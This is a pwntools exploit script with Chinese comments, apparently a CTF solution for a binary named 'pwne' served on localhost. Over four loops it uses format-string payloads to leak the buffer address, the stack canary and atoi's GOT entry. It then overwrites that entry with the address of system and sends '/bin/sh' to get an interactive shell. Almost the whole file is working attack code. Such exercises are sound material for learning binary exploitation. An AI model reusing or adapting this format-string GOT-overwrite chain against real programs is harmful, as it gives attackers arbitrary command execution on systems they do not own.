#!/usr/bin/python
# -*- coding: utf-8 -*-

from pwn import *
import struct

#context.log_level = 'debug'

LIB = ELF('/lib/i386-linux-gnu/libc.so.6')
EXE = ELF('./pwne')

EBP0 = 0xffffd538
ESP0 = 0xffffd4d0
CANARY_OFFSET = (EBP0 - 0xC - ESP0) / 4

PRINTF_OFFSET = 7

#io = process('./pwne')
io = remote('127.0.0.1', 4444)

# 第1次循环
# 非必要步骤
# 获取 buf 地址以及 ebp 地址
print
log.info('**** printf [buf] and [ebp] address ****')
io.sendlineafter('N]\n', 'Y')
io.sendlineafter('NAME:\n\n', '%x')
out = io.recvuntil('AGE:\n\n')
buf_addr = int(out.split('\n')[1], 16)
log.success('buf_addr = {}'.format(hex(buf_addr)))

ebp_addr = buf_addr + 0x4C
log.success('ebp_addr = {}'.format(hex(ebp_addr)))

io.sendline('1926')

# 第2次循环
# 非必要步骤
# 获取 canary cookie
print
log.info('**** printf CANARY ****')
io.sendlineafter('N]\n', 'Y')
io.sendlineafter('NAME:\n\n', '%{}$x'.format(CANARY_OFFSET))
out = io.recvuntil('AGE:\n\n')
canary = int(out.split('\n')[1], 16)

log.success('CANARY = {}'.format(hex(canary)))


io.sendline('1926')


# 第3次循环
# 必要步骤
# 获取 atoi@got 与 system@got 地址
# 注意：由于必须调用一次 atoi 函数之后才能取到 atoi@got 信息，所以之前必须完成一个循环
print
log.info('**** printf [atoi@got] and [system@got] address ****')
atoi_got_plt = EXE.got['atoi']
payload = '%{}$s'.format(PRINTF_OFFSET + 1) + p32(atoi_got_plt)
io.sendlineafter('N]\n', 'Y')
io.sendlineafter('NAME:\n\n', payload)
out = io.recvuntil('AGE:\n\n')

atoi_got_p32 = out.split('\n')[1][:4]
atoi_got_addr, = struct.unpack('<I', atoi_got_p32)

log.success('atoi_got_addr = {}'.format(hex(atoi_got_addr)))

system_got_addr = LIB.symbols['system'] - LIB.symbols['atoi'] + atoi_got_addr

log.success('system_got_addr = {}'.format(hex(system_got_addr)))


io.sendline('1926')

# 第4次循环
# 必要步骤
# atoi@got.plt 原本指向 atoi@got
# 将 atoi@got.plt 指向内容修改为 system@got
# 再在 buf 中写入 "/bin/sh\x00"（buf中原本有其他内容，使用\x00主动截断）
# 调用 atoi(buf) 就变成了调用 system("/bin/sh")
print
log.info('**** replace [atoi@got] with [system@got] ****')
byte1 = system_got_addr & 0xff
byte2 = (system_got_addr & 0x00ffff00) >> 8

p = PRINTF_OFFSET + (32 / 4)
payload = '%{b1}c%{p1}$hhn%{b2}c%{p2}$hn'.format(b1=str(byte1), b2=str(byte2 - byte1), p1=p, p2=p + 1).ljust(32, 'A')
payload += p32(atoi_got_plt) + p32(atoi_got_plt + 1)
io.sendlineafter('N]\n', 'Y')
io.sendlineafter('NAME:\n\n', payload)
log.success('put system@got({}) into [atoi@got.plt({})]'.format(hex(system_got_addr), hex(atoi_got_plt)))
print
log.info('**** write "/bin/sh\x00" to buf, then call atoi(buf) -> system("/bin/sh") ****')
io.sendlineafter('AGE:\n\n', '/bin/sh\x00')

io.interactive()
